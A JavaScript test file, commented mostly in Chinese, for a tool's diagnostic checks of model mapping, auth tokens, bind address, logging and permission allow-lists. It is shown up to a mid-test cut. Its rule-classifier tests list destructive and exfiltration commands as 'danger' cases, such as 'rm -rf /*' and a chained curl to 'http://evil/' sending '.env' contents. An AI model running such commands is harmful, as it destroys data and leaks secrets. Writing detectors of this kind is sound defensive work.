import test from 'node:test';
import assert from 'node:assert/strict';
import { resolveBindPlan } from '../../src/shared/bind-host.js';
import {
  LOG_ROTATE_THRESHOLD_BYTES,
  UPLOADS_FOOTPRINT_WARN_BYTES,
  classifyAuthToken,
  authTokenDiagnostic,
  classifyDeviceGateTopology,
  classifyPermissionRule,
  claudeConfigDirDiagnostic,
  computeReadiness,
  configFormatDiagnostic,
  identifySelfServer,
  envOverrideDiagnostic,
  fileEditExposureDiagnostic,
  accessProfileDiagnostic,
  bindDiagnostic,
  hooksBridgeDiagnostic,
  logSwitchDiagnostic,
  modelSettingsConflictDiagnostic,
  portOccupancyDiagnostic,
  resolveServicePortOwner,
  serviceUnitsDiagnostic,
  statuslineBridgeDiagnostic,
  statuslineConfigDiagnostic,
  summarizeDangerous,
  uploadsFootprintDiagnostic,
  menubarLivenessDiagnostic,
} from '../../src/ops/doctor-checks.js';

// 判据依据（2026-08-04 用本地假网关抓 /v1/messages 请求体实测，CLI 2.1.221）：
//   全局 sonnet + 目录映射 SONNET      → 发出 grok-4.5      （映射生效）
//   全局 sonnet + 目录只映射 OPUS      → 发出 claude-sonnet-5（退回官方全名，网关不认）
//   全局 claude-opus-5 + 全套映射      → 发出 claude-opus-5  （全名绕过映射）
//   全局不设 model + 全套映射          → 发出 glm-5.2        （CLI 自选档位，映射生效）
// ⇒ 决定映射是否命中的是「model 解析出的档位是否在该目录被映射」，不是 model 字符串是否等于映射目标。
const dirOf = (dir, tierTargets, extra = {}) => ({ dir, localModel: '', projectModel: '', tierTargets, ...extra });
const GW = { sonnet: 'grok-4.5', opus: 'glm-5.2', haiku: 'mimo-v2.5' };

test('modelSettingsConflictDiagnostic: 全局 model 是档位别名且该档位已映射 → ok（不得误报）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 别名带 [1m] 后缀仍按档位解析 → ok', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'opus[1m]',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 全局 model 是全名 → warn，且点名出问题的目录', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /claude-fable-5/);
  assert.match(r.detail, /gh-pages/);
});

test('modelSettingsConflictDiagnostic: 别名档位在该目录未映射 → warn（会退回官方全名）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/only-opus', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /only-opus/);
  // 必须判成「档位缺映射」而非「全名绕过」：两种 warn 的修法不同（补映射 vs 改 model），
  // 且只断言 detail 含 "sonnet" 会被「全名」文案一并满足 —— 变异检查 M3 实测到的空过。
  assert.match(r.detail, /档位 sonnet/);
  assert.ok(!/全名，不走档位映射表/.test(r.detail), 'sonnet 是别名，不该被判成模型全名');
});

test('modelSettingsConflictDiagnostic: opusplan 需 opus+sonnet 两档，缺一即 warn', () => {
  assert.equal(modelSettingsConflictDiagnostic({
    userModel: 'opusplan',
    dirs: [dirOf('/w/both', { opus: 'glm-5.2', sonnet: 'grok-4.5' })],
  }).status, 'ok');
  const r = modelSettingsConflictDiagnostic({
    userModel: 'opusplan',
    dirs: [dirOf('/w/only-opus', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /档位 sonnet/);
});

test('modelSettingsConflictDiagnostic: 混合目录下，无网关映射的目录不被连坐点名', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/official-no-gateway', {}), dirOf('/w/has-gateway', GW)],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /has-gateway/);
  assert.ok(!/official-no-gateway/.test(r.detail), '无映射的目录用全名完全合法，不该被点名');
});

test('modelSettingsConflictDiagnostic: 多目录只点名真冲突的那个，自洽目录不连坐', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/good', GW), dirOf('/w/bad', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /bad/);
  assert.ok(!/good/.test(r.detail), '自洽目录不该出现在告警里');
});

test('modelSettingsConflictDiagnostic: 目录 local 已 pin 网关模型全名 → ok（覆盖链清晰）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/gh-pages', GW, { localModel: 'grok-4.5' })],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 目录无任何 DEFAULT 映射 → ok（无网关，全名合法）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/official', {})],
  });
  assert.equal(r.status, 'ok');
  assert.equal(modelSettingsConflictDiagnostic({}).status, 'ok');
});

test('modelSettingsConflictDiagnostic: 未设 model 时主档位齐全 → ok，缺档 → warn', () => {
  assert.equal(modelSettingsConflictDiagnostic({ userModel: '', dirs: [dirOf('/w/full', GW)] }).status, 'ok');
  const r = modelSettingsConflictDiagnostic({ userModel: '', dirs: [dirOf('/w/partial', { sonnet: 'grok-4.5' })] });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /partial/);
});

test('statuslineConfigDiagnostic treats web statusline as self-contained', () => {
  const result = statuslineConfigDiagnostic();

  assert.equal(result.status, 'ok');
  assert.match(result.detail, /SDK/);
  assert.doesNotMatch(result.detail, /settings\.json/);
  assert.doesNotMatch(result.detail, /E16.*禁用/);
});

test('statuslineConfigDiagnostic：实际读取 off 状态，不再是恒定装饰性检查（code-review P2）', () => {
  const enabled = statuslineConfigDiagnostic(false);
  assert.equal(enabled.status, 'ok');
  assert.match(enabled.detail, /SDK/); // 与默认调用一致：启用态

  const off = statuslineConfigDiagnostic(true);
  assert.equal(off.status, 'ok'); // WEB_STATUSLINE=off 是合法配置，不是风险，仍 ok
  assert.match(off.detail, /已.*关闭|off/i);
  assert.notEqual(off.detail, enabled.detail, '开/关两态的 detail 文案应不同，证明确实读取了状态');
});

test('statuslineBridgeDiagnostic：区分已安装、未安装与用户改写后的 drift', () => {
  assert.equal(statuslineBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  assert.match(statuslineBridgeDiagnostic({ installState: 'installed' }).detail, /CLI.*同步/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'not-installed' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'not-installed' }).detail, /statusline:install/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'drifted' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'drifted' }).detail, /改写|漂移/);
  assert.equal(statuslineBridgeDiagnostic({ webOff: true, installState: 'not-installed' }).status, 'ok');
  assert.equal(statuslineBridgeDiagnostic({ bridgeOff: true, installState: 'not-installed' }).status, 'ok');
});

// ④ 安全体检核心：危险白名单判定 —— 公网暴露前审查 permissions.allow 里哪些规则过宽。
test.describe('classifyPermissionRule：危险规则判定', () => {
  const sev = r => classifyPermissionRule(r).severity;
  test('无限定 Bash → danger（等于放开 shell）', () => {
    assert.equal(sev('Bash'), 'danger');
    assert.equal(sev('Bash(*)'), 'danger');
    assert.equal(sev('Bash(:*)'), 'danger');
  });
  test('破坏性 / 提权命令 → danger', () => {
    assert.equal(sev('Bash(sudo apt*)'), 'danger');
    assert.equal(sev('Bash(rm -rf /*)'), 'danger');
    assert.equal(sev('Bash(chmod 777*)'), 'danger');
  });
  test('外联 / 外泄命令 → danger', () => {
    assert.equal(sev('Bash(curl*)'), 'danger');
    assert.equal(sev('Bash(wget http*)'), 'danger');
    assert.equal(sev('Bash(ssh*)'), 'danger');
  });
  test('裸写类工具（无路径限定）→ danger', () => {
    assert.equal(sev('Write'), 'danger');
    assert.equal(sev('Edit'), 'danger');
    assert.equal(sev('MultiEdit'), 'danger');
  });
  test('窄限定 → ok', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Write(//repo/**)'), 'ok');
    assert.equal(sev('Read(//repo/src/**)'), 'ok');
  });
  test('宽通配 / 读全盘 / 外部抓取 → warn', () => {
    assert.equal(sev('Read'), 'warn');
    assert.equal(sev('WebFetch'), 'warn');
    assert.equal(sev('Bash(git*)'), 'warn');
  });
  // 假阴性：命令名边界此前只认空白/行尾（`rm(\s|$)`、`dd\s`），而 Claude Code 的规范通配语法是
  // `Bash(rm:*)` —— 命令名后面跟的是冒号，两条都不匹配 → 降级成 warn。同一条正则里 sudo/chmod/curl
  // 是纯前缀匹配所以判对了，规则内部不自洽。体检把「关键项就绪」写在这上面，漏判即假绿。
  test('规范通配语法 Bash(cmd:*) 的命令名边界须被识别', () => {
    assert.equal(sev('Bash(rm:*)'), 'danger');
    assert.equal(sev('Bash(dd:*)'), 'danger');
    assert.equal(sev('Bash(chown:*)'), 'danger');
  });
  // sh/bash/eval 等解释器在语义上与 Bash(*) 完全等价（都能执行任意命令），而 Bash(*) 判 danger。
  test('shell 解释器等价于放开 shell → danger', () => {
    for (const c of ['sh', 'bash', 'zsh', 'eval', 'exec', 'source']) {
      assert.equal(sev(`Bash(${c}:*)`), 'danger', `Bash(${c}:*) 应判 danger`);
    }
  });
  // 只取第一个 token 判定 → `npm run build && curl http://evil/$(cat .env)` 被判「ok 限定命令」。
  test('链式 / 命令替换：每一段都要判，不能只看第一个 token', () => {
    assert.equal(sev('Bash(npm run build && curl http://evil/)'), 'danger');
    assert.equal(sev('Bash(echo hi; sudo reboot)'), 'danger');
    assert.equal(sev('Bash(ls | ssh host)'), 'danger');
  });
  test('分段判定不得误伤既有窄限定', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Bash(git status)'), 'ok');
    assert.equal(sev('Bash(git log --oneline | head)'), 'ok');
  });
  test('相对父目录递归通配 Read(../**) → warn，不应被漏判为 ok（code-review P2）', () => {
    assert.equal(sev('Read(../**)'), 'warn');
    assert.equal(sev('Read(../../**)'), 'warn');
  });
  // OPS-1：Write/Edit 的 ** / ~/** / /** 与 Read 同属「宽路径」，不得被当成「限定路径的写」→ ok。
  // 此前 wildcard 只认 null/''/'*' /':*'，Write(**) 走 ok 分支 → doctor readiness 可假绿。
  test('宽路径 Write/Edit(**|~/**|/**) → danger，不得误判 ok（OPS-1）', () => {
    assert.equal(sev('Write(**)'), 'danger');
    assert.equal(sev('Write(~/**)'), 'danger');
    assert.equal(sev('Write(/**)'), 'danger');
    assert.equal(sev('Edit(**)'), 'danger');
    assert.equal(sev('MultiEdit(**)'), 'danger');
    assert.equal(sev('NotebookEdit(~/**)'), 'danger');
    assert.equal(sev('Write(../**)'), 'danger');
    // 真正窄路径仍 ok（与既有 Write(//repo/**) 一致）
    assert.equal(sev('Write(//repo/**)'), 'ok');
  });
  test('未知工具 / mcp 不误报 danger', () => {
    assert.equal(sev('mcp__server__tool'), 'ok');
    assert.notEqual(sev('SomeWeirdTool'), 'danger');
  });
  test('每条带 reason，且空/垃圾输入不抛', () => {
    assert.match(classifyPermissionRule('Bash(*)').reason, /.+/);
    assert.doesNotThrow(() => classifyPermissionRule(''));
    assert.doesNotThrow(() => classifyPermissionRule(null));
  });
});

test.describe('summarizeDangerous', () => {
  test('混合规则 → ruleCount 全量 + dangerous 仅危险条（带 rule/reason）', () => {
    const s = summarizeDangerous(['Bash(*)', 'Read', 'Write(//r/**)', 'Bash(curl*)']);
    assert.equal(s.ruleCount, 4);
    assert.equal(s.dangerous.length, 2);
    assert.ok(s.dangerous.every(d => d.rule && d.reason));
  });
  test('空白名单 → ruleCount 0, dangerous []', () => {
    assert.deepEqual(summarizeDangerous([]), { ruleCount: 0, dangerous: [] });
  });
});

test.describe('classifyAuthToken：绝不回显明文', () => {
  // §1.9 之后未设置是 fail 不是 warn：没有 token server 根本起不来。
  test('undefined → fail(isSet false)', () => {
    assert.deepEqual(classifyAuthToken(undefined), { status: 'fail', isSet: false });
  });
  test('空串 → fail', () => {
    assert.equal(classifyAuthToken('').status, 'fail');
  });
  test('短 token → warn，返回 length 但无明文', () => {
    const r = classifyAuthToken('abc');
    assert.equal(r.status, 'warn');
    assert.equal(r.length, 3);
    assert.equal(JSON.stringify(r).includes('abc'), false);
  });
  test('正常 token → ok，不回显明文', () => {
    const r = classifyAuthToken('x'.repeat(32));
    assert.equal(r.status, 'ok');
    assert.equal(JSON.stringify(r).includes('x'.repeat(32)), false);
  });
});

// ── AUTH_TOKEN：鉴权是启动前提（hard-rules §1.9，2026-09-01） ────────────────
// 此前这一组钉的是「doctor 说的对外可达 == server 真绑的地址」，因为无 token 时 server 会
// 静默降级绑 loopback、而两个 doctor 各自猜那个地址。现在没有「无 token 部署」这个状态了：
// 缺 token 一律拒绝启动，绑哪个地址由 BIND 项单独报告，本项只回答「令牌本身够不够」。
test.describe('authTokenDiagnostic：缺令牌 = 起不来', () => {
  test('★ 未设置 / 空串 / 纯空白 一律 fail，并说清后果是拒绝启动', () => {
    for (const token of [undefined, null, '', ' ', '   ', '\t\n']) {
      const d = authTokenDiagnostic({ token });
      assert.equal(d.status, 'fail', JSON.stringify(token));
      assert.match(d.detail, /启动/, `${JSON.stringify(token)} 要说清 server 起不来`);
      assert.match(d.detail, /setup/, '要给出行动出路');
    }
  });

  test('★ 不再谈绑定地址——那是 BIND 项的职责，混进来就会在 BIND_MODE=loopback 时说反话', () => {
    for (const token of [undefined, '   ', 'x'.repeat(64)]) {
      const d = authTokenDiagnostic({ token });
      assert.doesNotMatch(d.detail, /0\.0\.0\.0|127\.0\.0\.1/, JSON.stringify(token));
    }
  });

  test('纯空白 token 单独点名（它 truthy，此前恰因此绑上 0.0.0.0，是最危险的一格）', () => {
    const d = authTokenDiagnostic({ token: '   ' });
    assert.equal(d.status, 'fail');
    assert.equal(d.safe.blank, true);
    assert.match(d.detail, /空白/);
    assert.doesNotMatch(JSON.stringify(d), /\s{3}/, '别把 token 本身回显出来');
  });

  test('弱 token（<8）仍是 warn，不是 fail——它能起来，只是该换个更长的', () => {
    const d = authTokenDiagnostic({ token: 'abc' });
    assert.equal(d.status, 'warn');
    assert.match(d.detail, /3 /);
  });

  test('正常 token → ok，只报长度不回显值', () => {
    const d = authTokenDiagnostic({ token: 'x'.repeat(64) });
    assert.equal(d.status, 'ok');
    assert.match(d.detail, /64/);
    assert.doesNotMatch(JSON.stringify(d), /xxxx/);
  });

  test('英文分支同样说清「拒绝启动」', () => {
    const d = authTokenDiagnostic({ token: '', lang: 'en' });
    assert.equal(d.status, 'fail');
    assert.match(d.detail, /start|setup/i);
    assert.doesNotMatch(d.detail, /[一-龥]/);
  });
});

test.describe('bindDiagnostic（D22：监听地址自洽性）', () => {
  test('未声明 BIND_MODE + 有 token → ok，说明当前对外可达', () => {
    const d = bindDiagnostic({ bindPlan: resolveBindPlan({ authToken: 'x'.repeat(64) }) });
    assert.equal(d.status, 'ok');
    assert.equal(d.name, 'BIND');
    assert.match(d.detail, /0\.0\.0\.0/);
  });

  test('★ 无 token → fail（§1.9：没令牌就不启动，本机也一样）', () => {
    const d = bindDiagnostic({ bindPlan: resolveBindPlan({}) });
    assert.equal(d.status, 'fail');
    assert.equal(d.safe.refuseCode, 'token_required');
    assert.match(d.detail, /启动/);
  });

  test('★ 配置会导致启动失败 → fail，并原样带出拒绝原因', () => {
    for (const plan of [
      resolveBindPlan({ bindMode: 'lan' }),
      resolveBindPlan({ authToken: 'x'.repeat(64), bindMode: 'custom' }),
      resolveBindPlan({ authToken: 'x'.repeat(64), bindMode: 'zzz' }),
    ]) {
      const d = bindDiagnostic({ bindPlan: plan });
      assert.equal(d.status, 'fail', plan.refuse?.code);
      assert.match(d.detail, /启动/, '要说清后果是起不来');
      assert.equal(d.safe.refuseCode, plan.refuse.code);
    }
  });

  test('loopback 模式 → ok 但要点明「手机连不上是预期」（否则用户会当成故障排查）', () => {
    const d = bindDiagnostic({ bindPlan: resolveBindPlan({ authToken: 'x'.repeat(64), bindMode: 'loopback' }) });
    assert.equal(d.status, 'ok');
    assert.match(d.detail, /转发|SSH|隧道/);
  });

  test('★ 英文分支不得混入中文——refuse.detail 是 bind-host.js 里的中文串，不能直接嵌进英文文案', () => {
    for (const plan of [
      resolveBindPlan({ bindMode: 'lan' }),
      resolveBindPlan({ authToken: 'x'.repeat(64), bindMode: 'custom' }),
      resolveBindPlan({ authToken: 'x'.repeat(64), bindMode: 'zzz' }),
    ]) {
      const d = bindDiagnostic({ bindPlan: plan, lang: 'en' });
      assert.doesNotMatch(d.detail, /[一-龥]/, `${plan.refuse.code} 的英文文案混了中文：${d.detail}`);
      assert.match(d.detail, /BIND_MODE|BIND_HOST|AUTH_TOKEN/, '英文文案也要点名相关配置键');
    }
  });

  test('中文分支给出可读原因（不只是 code）', () => {
    const d = bindDiagnostic({ bindPlan: resolveBindPlan({ bindMode: 'lan' }) });
    assert.match(d.detail, /AUTH_TOKEN/);
    assert.doesNotMatch(d.detail, /token_required/, '给人看的话里不该出现内部 code');
  });

  test('safe 只出结构化事实，不回显自定义地址之外的东西；英文分支完整', () => {
    const d = bindDiagnostic({ bindPlan: resolveBindPlan({ authToken: 'x'.repeat(64), bindMode: 'custom', bindHost: '::' }), lang: 'en' });
    assert.equal(d.status, 'ok');
    assert.equal(d.safe.host, '::');
    assert.equal(d.safe.publiclyReachable, true);
    assert.equal(d.safe.refuseCode, null);
    assert.match(d.detail, /::/);
  });
});

test.describe('computeReadiness：公网暴露就绪度', () => {
  const chk = (id, status, safe) => ({ id, status, safe });
  test('任一 fail → blocked', () => {
    assert.equal(computeReadiness([chk('CLAUDE_BIN', 'fail')]).level, 'blocked');
  });
  test('危险白名单 + 无 CF + 弱 token → blocked', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'warn'), chk('CF_ACCESS', 'ok', { enabled: false }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'blocked');
  });
  test('危险白名单 + 有 CF Access → caution（有兜底）', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'ok'), chk('CF_ACCESS', 'ok', { enabled: true }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'caution');
  });
  test('全净 → ready', () => {
    assert.equal(computeReadiness([chk('AUTH_TOKEN', 'ok'), chk('WHITELIST', 'ok', { dangerous: [] })]).level, 'ready');
  });
});

test.describe('classifyDeviceGateTopology（AUTH-003）', () => {
  test('CF Access 已开 → ok（设备门 bypass 为设计路径）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: true });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
  });
  test('有 AUTH_TOKEN 无 CF Access → ok（Host 感知设备门，A2 不再误报 tunnel 跳过）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: false });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
    assert.equal(r.safe.note, 'host_aware_device_gate');
    assert.match(r.detail, /设备门|CF Access/);
  });
  test('无 AUTH_TOKEN → ok（仅本机）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: false, cfEnabled: false });
    assert.equal(r.status, 'ok');
  });
});

// D12：hooks 桥安装态四分支。与 D6 同款——drifted 不自作主张覆盖，只提示用户自己看。
test('hooksBridgeDiagnostic：off / 已安装 / 漂移 / 未安装 四态', () => {
  assert.equal(hooksBridgeDiagnostic({ bridgeOff: true }).status, 'ok');
  assert.equal(hooksBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  const drifted = hooksBridgeDiagnostic({ installState: 'drifted' });
  assert.equal(drifted.status, 'warn');
  assert.match(drifted.detail, /勿强行覆盖/);
  const missing = hooksBridgeDiagnostic({ installState: 'not-installed' });
  assert.equal(missing.status, 'warn');
  assert.match(missing.detail, /hooks:install/);
});

// D17：配置格式可见性。核心断言是 legacy env 的 status 必须是 **ok 而非 warn**——
// .env 是长期受支持的一等路径（产品立场，见 doctor-checks.configFormatDiagnostic 头注），
// 这项检查的唯一目的是给 headless 旧用户一条主动发现迁移能力的路，不是催迁。
test('configFormatDiagnostic：config / env / none 三态，legacy 恒为 ok', () => {
  const unified = configFormatDiagnostic({ source: 'config' });
  assert.equal(unified.status, 'ok');
  assert.match(unified.detail, /ccm\.config\.json/);

  const legacy = configFormatDiagnostic({ source: 'env' });
  assert.equal(legacy.status, 'ok');
  assert.match(legacy.detail, /长期受支持/);
  assert.match(legacy.detail, /config\.js migrate/);

  const legacyEn = configFormatDiagnostic({ source: 'env', lang: 'en' });
  assert.equal(legacyEn.status, 'ok');
  assert.match(legacyEn.detail, /supported long-term/);
  assert.match(legacyEn.detail, /config\.js migrate/);

  const fresh = configFormatDiagnostic({ source: 'none' });
  assert.equal(fresh.status, 'ok');
  assert.match(fresh.detail, /setup\.js/);
});

// ★「配置坏了」与「还没配置」是两回事，此前被压成同一格：doctor 把解析失败映射成 source:'none'，
// 于是一个 server 根本起不来的文件被报成 ok「尚未配置（首次安装：…）」，doctor 还 exit 0。
// 桌面端「运行体检」和文档里的 agent recipe 都读这个退出码，看到的是一份干净的预检。
test('★ configFormatDiagnostic：解析失败必须是 fail，且不能伪装成「尚未配置」', () => {
  const broken = configFormatDiagnostic({ source: 'none', error: 'Unexpected token } in JSON at position 42' });
  assert.equal(broken.status, 'fail', 'server 起不来的配置不能报 ok');
  assert.doesNotMatch(broken.detail, /尚未配置|首次安装/, '别把「坏了」说成「还没配」——用户会去跑 setup 覆盖掉它');
  assert.match(broken.detail, /Unexpected token/, '要把解析器的原话带出来，否则用户不知道改哪一行');

  const brokenEn = configFormatDiagnostic({ source: 'none', error: 'bad json', lang: 'en' });
  assert.equal(brokenEn.status, 'fail');
  assert.doesNotMatch(brokenEn.detail, /Not configured yet/);
  assert.match(brokenEn.detail, /bad json/);
});

// ── 2026-08-04 code review：本次改动自身的两个洞（实测确认）────────────────────
// 洞一：resolveTiers 用 `TIER_ALIASES[bare]` 做计算属性查找，`constructor` / `__proto__`
// 经原型链返回真值非数组 → 下游 tiers.filter 抛 TypeError，冲出 runDoctor 打死整份体检报告
// （不是降级成一行 warn，是整个诊断面板挂掉）。
test('modelSettingsConflictDiagnostic: 原型链键名不得让整份体检崩掉', () => {
  for (const evil of ['constructor', '__proto__', 'toString', 'valueOf', 'hasOwnProperty']) {
    const r = modelSettingsConflictDiagnostic({
      userModel: evil,
      dirs: [dirOf('/w/gw', GW)],
    });
    assert.ok(r && typeof r.status === 'string', `model=${evil} 必须返回正常结果而非抛异常`);
    assert.equal(r.status, 'warn', `${evil} 不是档位别名，应按模型全名判 warn`);
  }
});

// ---- 日志开关长开检出 ----
// 事故实证（2026-08-04 复核）：~/Library/Logs/ccm-server.log.0.gz 解压 156,351,605 字节 = 149MiB，
// 归档时间 7/18，与 app.js:2661 注释「DEBUG_SDK_MESSAGES 长开曾把日志刷到 149M 而无任何界面可见」
// 对得上。当时唯一的可见性是事后翻磁盘——doctor 此前对三个日志开关零感知（grep LOG_ scripts/doctor.js
// 无命中）。
//
// 判据与服务状态面板对齐（logic.js serviceStatusBasicRows：只有 sdkDebug 开才 alert）：
// interactions/stderr 量级小得多，单独开着是正常调试态，不该每次体检都报 warn 制造噪音——
// 那样人会学会忽略它，检出就白做了（同 metrics.js recentDeliveryFailure 的「狼来了」考虑）。
// 但它们叠加「日志已经涨过轮转阈值」时仍要提醒：此时保留窗口正在被压缩。
const noLogFile = { interactions: false, sdkDebug: false, stderr: false, logFileBytes: 0 };

test('logSwitchDiagnostic: 三个开关全关 → ok', () => {
  const r = logSwitchDiagnostic(noLogFile);
  assert.equal(r.status, 'ok');
});

test('logSwitchDiagnostic: DEBUG_SDK_MESSAGES 开 → warn 且点名该开关（149M 事故元凶）', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, sdkDebug: true });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /DEBUG_SDK_MESSAGES/);
});

// 防「文案写死」空过：实现若不分开关种类、恒回同一串，本条会红。
test('logSwitchDiagnostic: 仅 LOG_STDERR 开且日志未超阈值 → ok，且不得点名 DEBUG_SDK_MESSAGES', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, stderr: true });
  assert.equal(r.status, 'ok');
  assert.match(r.detail, /LOG_STDERR/);
  assert.doesNotMatch(r.detail, /DEBUG_SDK_MESSAGES/);
});

// 防「大小分支空过」：实现若忽略 logFileBytes，本条会红。
test('logSwitchDiagnostic: 仅 LOG_STDERR 开但日志已超轮转阈值 → 升级为 warn 且带出实际体积', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, stderr: true, logFileBytes: LOG_ROTATE_THRESHOLD_BYTES + 1 });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /\d+\s*MB/);
});

// 两个 warn 分支（sdkDebug / oversized）的 detail 都含开关名与体积，只断言这两项会被另一分支
// 误满足——首轮变异检查实测：把 `if (sdkDebug)` 改成 `if (false)` 时本条仍绿（落到 oversized 分支
// 照样通过）。故必须再断言一句 sdkDebug 分支【独有】的收尾指引，才真正钉住走的是哪条分支。
test('logSwitchDiagnostic: sdkDebug 开且日志超阈值 → 走 sdkDebug 分支，开关名与体积同时出现', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, sdkDebug: true, logFileBytes: 200 * 1024 * 1024 });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /DEBUG_SDK_MESSAGES/);
  assert.match(r.detail, /200\s*MB/);
  assert.match(r.detail, /调试完请/, 'sdkDebug 分支独有文案；缺了说明落到了 oversized 分支');
});

// 日志文件读不到（未配置 LOG_FILE / 前台跑 / 权限不足）时，体检不得因此崩或误报体积。
test('logSwitchDiagnostic: logFileBytes 缺省 → 按「未超阈值」处理，不出现体积文案', () => {
  const r = logSwitchDiagnostic({ interactions: true, sdkDebug: false, stderr: false });
  assert.equal(r.status, 'ok');
  assert.match(r.detail, /LOG_INTERACTIONS/);
  assert.doesNotMatch(r.detail, /MB/);
});

// R9-uploads（2026-08-06 BUG hunting review）：只报可见性，【不自动清理】。
// .ccm-uploads/ 落在机主真实工作目录里，且历史消息回显要读它（附件预览走 browse:read）——
// 按 TTL/容量删会让老对话的图片预览全坏掉。要做对只有「识别 transcript 已引用不到的孤儿」一条路，
// 复杂度与风险不匹配实测增长率（22 天 2.5MB）。故只给体积可见性，清不清由机主判断。
test.describe('uploadsFootprintDiagnostic（R9：附件目录可见性，不自动删）', () => {
  test('无附件目录 → ok 且不啰嗦', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /无附件/);
  });

  test('体积在阈值内 → ok，报总量供参照', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [{ cwd: '/repo', bytes: 5 * 1024 * 1024, files: 12 }] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /5 MB|12/);
  });

  test('超阈值 → warn，且明说不会自动清理、要机主自己删', () => {
    const r = uploadsFootprintDiagnostic({
      dirs: [{ cwd: '/repo', bytes: UPLOADS_FOOTPRINT_WARN_BYTES + 1, files: 400 }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /不会自动清理|手动/);
  });

  test('多目录合计判阈值，detail 里点名最大的那个', () => {
    const half = Math.ceil(UPLOADS_FOOTPRINT_WARN_BYTES / 2) + 1;
    const r = uploadsFootprintDiagnostic({
      dirs: [{ cwd: '/small', bytes: 1024, files: 1 }, { cwd: '/big', bytes: half * 2, files: 300 }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /\/big/);
  });

  test('不回显完整路径以外的内容，也不因单目录为 0 而误报', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [{ cwd: '/repo', bytes: 0, files: 0 }] });
    assert.equal(r.status, 'ok');
  });
});

// ── claudeConfigDirDiagnostic ─────────────────────────────────────────────
// CLI/SDK 都认 CLAUDE_CONFIG_DIR（SDK 实测：projects 根 = (CLAUDE_CONFIG_DIR ?? ~/.claude)/projects），
// 本仓 history.js 的 CLAUDE_DIR 却硬编码 homedir()。设了它 = CLI 把 transcript 落到别处、本仓去老地方找，
// 而失败形态是「读不到 = 当作没有会话」，静默到无法自查。这里只把它变成启动时说得清的告警。
test.describe('claudeConfigDirDiagnostic', () => {
  test('未设置 → ok', () => {
    assert.equal(claudeConfigDirDiagnostic({ configDir: '' }).status, 'ok');
    assert.equal(claudeConfigDirDiagnostic({}).status, 'ok');
    assert.equal(claudeConfigDirDiagnostic().status, 'ok');
  });

  test('只有空白字符 → 视同未设置', () => {
    assert.equal(claudeConfigDirDiagnostic({ configDir: '   ' }).status, 'ok');
  });

  test('设置了 → warn，点名变量值与「读不到历史」这一具体后果', () => {
    const r = claudeConfigDirDiagnostic({ configDir: '/custom/claude-home' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /CLAUDE_CONFIG_DIR/);
    assert.match(r.detail, /\/custom\/claude-home/, '要回显实际值，否则排障时不知道是谁设的');
    assert.match(r.detail, /历史|会话|transcript/);
  });
});

// ── D16：LaunchAgent 安装态 ───────────────────────────────────────────────
// 判据只消费 scripts/service.js status --json 的 ownership/state/drift 三个字段，
// **绝不回显 plistPath 绝对路径**（doctor-runtime.js:3 的脱敏纪律）。
test.describe('serviceUnitsDiagnostic', () => {
  const server = (over = {}) => ({
    unit: 'server', label: 'com.ccm.server', known: true,
